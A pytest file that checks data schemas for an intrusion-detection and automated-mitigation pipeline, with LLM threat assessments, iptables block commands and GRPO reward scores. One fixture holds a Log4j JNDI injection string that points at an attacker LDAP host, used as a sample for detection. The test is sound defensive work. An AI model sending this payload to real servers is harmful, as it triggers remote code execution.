import pytest
from pydantic import ValidationError

from app.core.state import (
    FlowMetrics,
    NIDSAssessment,
    NIDSAlert,
    ActionPayload,
    ExecutionAudit,
    GRPORewardBreakdown,
    MitigationEnvelope,
    IncidentState,
    NODE_IP_MAP,
)


@pytest.fixture
def valid_nids_alert_dict():
    return {
        "alert_id": "evt-001-log4j",
        "timestamp": "2026-10-18T15:30:00Z",
        "source_node": "pc-2",
        "source_ip": "172.28.0.12",
        "target_node": "pc-4",
        "target_ip": "172.28.0.14",
        "dest_port": 8080,
        "protocol": "HTTP",
        "flow_metrics": {
            "packet_count_2s": 45,
            "byte_count_2s": 12400,
            "syn_ratio": 0.15,
            "unique_dest_ports": [8080],
            "payload_sample": "GET /?x=${jndi:ldap://172.28.0.12:1389/Exploit} HTTP/1.1"
        },
        "nids_llm_assessment": {
            "attack_signature": "Log4j JNDI Lookup Remote Code Execution",
            "mitre_tactic": "Initial Access",
            "mitre_technique_id": "T1190",
            "confidence_score": 0.98,
            "severity": "CRITICAL",
            "raw_telemetry_summary": "Outbound JNDI LDAP callback string detected in HTTP header."
        }
    }


@pytest.fixture
def valid_mitigation_envelope_dict():
    return {
        "threat_classification": "RCE_ATTEMPT",
        "severity": "CRITICAL",
        "reasoning_trace": (
            "1. Alert indicates a Log4j JNDI RCE attempt from pc-2 (172.28.0.12) targeting pc-4 (172.28.0.14) on TCP port 8080. "
            "2. Surgical BLOCK_SOURCE_IP on pc-4 dropping packets from 172.28.0.12 to port 8080 neutralizes the attacker with ZERO collateral impact."
        ),
        "chosen_mitigation": {
            "action_type": "BLOCK_SOURCE_IP",
            "target_container": "pc-4",
            "source_ip": "172.28.0.12",
            "dest_port": 8080,
            "iptables_cmd": "iptables -A INPUT -s 172.28.0.12 -p tcp --dport 8080 -j DROP",
            "estimated_collateral_impact": "ZERO"
        },
        "rejected_alternative": {
            "action_type": "ISOLATE_NODE",
            "target_container": "pc-4",
            "source_ip": "172.28.0.12",
            "dest_port": 8080,
            "iptables_cmd": "iptables -P INPUT DROP",
            "estimated_collateral_impact": "HIGH"
        },
        "rejection_reason": "Dropping all INPUT traffic on pc-4 severs legitimate traffic from pc-1, pc-3, and pc-5."
    }


def test_contract_a_valid_parse(valid_nids_alert_dict):
    alert = NIDSAlert.model_validate(valid_nids_alert_dict)
    assert alert.source_node == "pc-2"
    assert alert.target_node == "pc-4"
    assert alert.nids_llm_assessment.mitre_technique_id == "T1190"
    assert alert.flow_metrics.packet_count_2s == 45


def test_contract_a_pdf_typo_resilience(valid_nids_alert_dict):
    """
    Ensures NIDSAlert gracefully handles the two PDF OCR traps:
    1. 'nids_Ilm_assessment' (capital I) instead of 'nids_llm_assessment'
    2. Cyrillic 'рс-2' (\u0440\u0441-2) instead of ASCII 'pc-2'
    """
    mutated = dict(valid_nids_alert_dict)
    mutated["nids_Ilm_assessment"] = mutated.pop("nids_llm_assessment")
    mutated["source_node"] = "\u0440\u0441-2"  # Cyrillic р and с
    mutated["target_node"] = "\u0440\u0441-3"

    alert = NIDSAlert.model_validate(mutated)
    assert alert.source_node == "pc-2"
    assert alert.target_node == "pc-3"
    assert alert.nids_llm_assessment.severity == "CRITICAL"


def test_contract_a_invalid_ip_and_mitre_regex(valid_nids_alert_dict):
    # Out-of-range IP (172.28.0.99 is outside 172.28.0.11-15)
    bad_ip = dict(valid_nids_alert_dict)
    bad_ip["source_ip"] = "172.28.0.99"
    with pytest.raises(ValidationError):
        NIDSAlert.model_validate(bad_ip)

    # Invalid MITRE ID format
    bad_mitre = dict(valid_nids_alert_dict)
    bad_mitre["nids_llm_assessment"] = dict(valid_nids_alert_dict["nids_llm_assessment"])
    bad_mitre["nids_llm_assessment"]["mitre_technique_id"] = "MITRE-1190"
    with pytest.raises(ValidationError):
        NIDSAlert.model_validate(bad_mitre)

    # Valid sub-technique MITRE ID (e.g., T1498.001) should pass
    sub_mitre = dict(valid_nids_alert_dict)
    sub_mitre["nids_llm_assessment"] = dict(valid_nids_alert_dict["nids_llm_assessment"])
    sub_mitre["nids_llm_assessment"]["mitre_technique_id"] = "T1498.001"
    alert = NIDSAlert.model_validate(sub_mitre)
    assert alert.nids_llm_assessment.mitre_technique_id == "T1498.001"


def test_contract_b_valid_parse_and_optional_fields(valid_mitigation_envelope_dict):
    envelope = MitigationEnvelope.model_validate(valid_mitigation_envelope_dict)
    assert envelope.chosen_mitigation.action_type == "BLOCK_SOURCE_IP"
    assert envelope.rejected_alternative.action_type == "ISOLATE_NODE"
    assert envelope.execution_audit is None
    assert envelope.grpo_scoring_debug is None

    # Populate ExecutionAudit and GRPORewardBreakdown
    envelope.execution_audit = ExecutionAudit(
        executed_successfully=True,
        exit_code=0,
        stdout_stderr="",
        post_mitigation_packet_drop_verified=True
    )
    envelope.grpo_scoring_debug = GRPORewardBreakdown(
        schema_compliance_score=2.0,
        entity_grounding_score=3.0,
        surgical_precision_score=3.0,
        total_reward=8.0
    )
    dumped = envelope.model_dump()
    assert dumped["execution_audit"]["executed_successfully"] is True
    assert dumped["grpo_scoring_debug"]["total_reward"] == 8.0


def test_contract_b_grpo_reward_bounds():
    # Out-of-bounds reward score (> 3.0 for entity_grounding_score) must fail
    with pytest.raises(ValidationError):
        GRPORewardBreakdown(
            schema_compliance_score=2.0,
            entity_grounding_score=4.5,
            surgical_precision_score=3.0,
            total_reward=9.5
        )


def test_legacy_incident_state_backward_compatibility():
    state = IncidentState(
        incident_id="INC-001",
        alert_signature="Test Alert",
        source_ip="172.28.0.12",
        target_ip="172.28.0.14"
    )
    assert state.status == "ALERT_RECEIVED"
    assert state.reviewer_decision == "PENDING"
    assert len(NODE_IP_MAP) == 5